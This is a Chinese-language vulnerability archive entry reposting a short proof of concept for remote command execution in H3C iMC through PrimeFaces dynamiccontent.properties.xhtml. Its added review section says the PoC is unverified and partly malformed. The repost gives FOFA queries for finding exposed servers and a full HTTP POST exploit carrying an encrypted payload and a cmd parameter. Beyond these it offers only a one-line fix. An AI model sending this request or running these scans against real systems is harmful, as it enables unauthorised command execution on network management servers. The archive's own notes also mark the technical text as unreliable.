---
version: "H3C IMC智能管理中心"
source: "MrWQ/vulnerability-paper"
id: "vw-3e8dc7c48f652b7fa26b2f1d"
entity_id: "ve-3e8dc7c48f652b7fa26b2f1d"
schema_version: "1"
fofa_unverified: "语句**"
title: "H3C-IMC RCE 漏洞"
product: "H3C iMC PrimeFaces"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无iMC/PrimeFaces版本及认证说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/H3C/H3C-IMC%20RCE%20%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://mp.weixin.qq.com/s/2dA_81JHHfl183QtnHd0EQ"
source_status: "recorded"
---

# H3C-IMC RCE 漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：H3C iMC PrimeFaces
- 本文讨论：dynamiccontent.properties.xhtml代码执行
- 版本、权限与配置前提：无iMC/PrimeFaces版本及认证说明
- 资料类型：短PoC转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 与135同长pfdrid重复；标题xhtm漏l
- 请求缺头体空行；fofa元数据语句残缺
- 密文载荷无生成/密钥依赖说明，修复仅权限控制
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- PrimeFaces依赖/认证和版本待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2dA_81JHHfl183QtnHd0EQ)

**漏洞简介**

H3C IMC（Intlligent Management Center）智能管理中心是 H3C 推出的下一代业务只能管理产品。它融合了当前多个产品，以统一风格提供与网络相关的各类管理、控制、监控等功能；同时以开放的组件化的架构原型，向平台及其承载业务提供分布式、分级式交互管理特性；并未业务软件的下一代产品提供最可靠的、可扩展、高性能的业务平台。  

H3C IMC dynamiccontent.properties.xhtm 存在远程命令执行，攻击者通过构造特殊的请求造成远程命令执行。

**影响范围**

```
H3C IMC智能管理中心

```

**FOFA 语句**

```
body="iMC来宾接入自助管理系统"
"/imc/javax.faces.resource/images/login_logo_h3c.png.jsf?ln=primefaces-imc-new-webui"
body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui"

```

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyHwKsSBjdzf685Rj7EIOfthp0icqIzK5vmib6icgCemuichWZ3slibnibSbwOguGxINrHiaOBkq1sJiclNcg/640?wx_fmt=png)

POC：  

cmd 执行想要执行的命令  

```http
POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
Host: ****
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Content-Length: 1564
pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami

```

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyHwKsSBjdzf685Rj7EIOftMjFLonibqVagibxVSmW34mWQA4amhZ7BtmyKnfLYf9vicJo6SnEG21nTQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyHwKsSBjdzf685Rj7EIOftbAAWToicibuefoej4xfzIKjq1GTEbscTRaWNweibSoFpMnRBxBZMMUHvQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyHwKsSBjdzf685Rj7EIOftnK9bQBMsdsQYKTEGjtEmmIrnoPoaNwpDibFqLqZmb9wHCvxTSPXRzQw/640?wx_fmt=png)

**修复建议  
**

进行权限控制  

![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVysra7ItOufZQ85GXBSX9vYa0PicnDzIv4xibegRTm4976s4ZMcq0Ke9uH8TG8RqC4ZbaXK33IrmicxA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)  

**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**公众号**内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金**。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
